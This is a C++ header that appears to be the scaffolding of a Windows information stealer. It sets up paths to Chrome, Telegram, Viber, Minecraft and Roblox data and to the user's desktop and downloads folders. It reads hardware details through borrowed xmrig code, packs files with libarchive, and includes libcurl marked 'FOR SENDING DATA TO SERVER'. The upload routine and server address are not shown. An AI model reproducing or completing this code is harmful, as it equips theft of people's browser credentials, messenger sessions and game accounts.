#pragma once

#include "Config.h"

#include <iostream>           // FOR DEBUGGING
#include <string>             // FOR WORK WITH STRINGS
#include <fstream>            // FOR WORK WITH FILES
#include <io.h>               // FOR CORRECTLY PRINT CYRILLIC CHARACTERS
#include <Windows.h>          // FOR TlHelp32.h
#include <tlhelp32.h>         // FOR WORK WITH PROCESSES
#include <thread>             // FOR MULTITHREADING
#include "backend/cpu/Cpu.h"  // xmrig::Cpu       FOR GETTING CPU INFO
#include "hw/dmi/DmiReader.h" // xmrig::DmiReader FOR GETTING MOTHERBOARD AND RAM INFO
#include "archive.h"          // FOR CREATE A ARCHIVE
#include "archive_entry.h"    // FOR archive.h
#include "curl/curl.h"        // FOR SENDING DATA TO SERVER

#pragma comment(lib, "archive.lib")
#pragma comment(lib, "libcurl.lib")

//   FOR INDEXING FILES
#ifdef __cpp_lib_experimental_filesystem
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
#include <experimental/filesystem>
namespace fs = std::experimental::filesystem::v1;
#elif __cpp_lib_filesystem
#include <filesystem>
namespace fs = std::filesystem;
#else
#error "no filesystem support ='("
#endif
// ! FOR INDEXING FILES

#pragma warning(disable : 4996) // Unsafe function strcpy, strcat, ...

using namespace std;

// Getting current directory and adding filename
wstring getabspathincurrdir(const wchar_t* path = L"") {
    vector<wchar_t> pathBuf;
    DWORD copied = 0;
    do {
        pathBuf.resize(pathBuf.size() + MAX_PATH);
        copied = GetModuleFileNameW(nullptr, &pathBuf.at(0), pathBuf.size());
    } while (copied >= pathBuf.size());
    pathBuf.resize(copied);
    wstring path_(pathBuf.begin(), pathBuf.end());
    return fs::path(path_).parent_path().wstring() + L"\\" + wstring(path);
}

// Getting current directory and adding filename
string getabspathincurrdira(const char* path = "") {
    vector<char> pathBuf;
    DWORD copied = 0;
    do {
        pathBuf.resize(pathBuf.size() + MAX_PATH);
        copied = GetModuleFileNameA(nullptr, &pathBuf.at(0), pathBuf.size());
    } while (copied >= pathBuf.size());
    pathBuf.resize(copied);
    string path_(pathBuf.begin(), pathBuf.end());
    return fs::path(path_).parent_path().string() + "\\" + string(path);
}

wchar_t* self       = new wchar_t[MAX_PATH];
wchar_t* downloads  = new wchar_t[MAX_PATH];
wchar_t* desktop    = new wchar_t[MAX_PATH];
int status          = 0;
wstring profile;
wchar_t* chromedir  = new wchar_t[MAX_PATH];
wchar_t* dtdir      = new wchar_t[MAX_PATH];
wchar_t* tdir = new wchar_t[MAX_PATH];
wchar_t* viber      = new wchar_t[MAX_PATH];
wchar_t* minecraft  = new wchar_t[MAX_PATH];
wchar_t* roblox     = new wchar_t[MAX_PATH];
CURLcode ccode;
wofstream log_file(getabspathincurrdir(L"tmp\\result.log"));

inline bool open(wofstream& file, wstring filename) {
    file.open(filename);
    file.imbue(locale(".utf-8"));
    return fs::exists(filename) && file.is_open() && file.good();
}
#define curl_opt(curl, opt, val) if((ccode = curl_easy_setopt(curl, opt, val)) != CURLE_OK) {MessageBoxA(NULL, ((string)"curl_easy_setopt() failed: " + curl_easy_strerror(ccode)).c_str(), "TEXT", MB_OK); }

#define STAT_MAX_SIZE 10
#define STARTED_STAT  L"Started..."
#define OK_STAT       L"OK!       "
#define FAIL_STAT     L"FAIL!     "
#define DISABLED_STAT L"DISABLED! "
#define WAITING_STAT  L"Waiting..."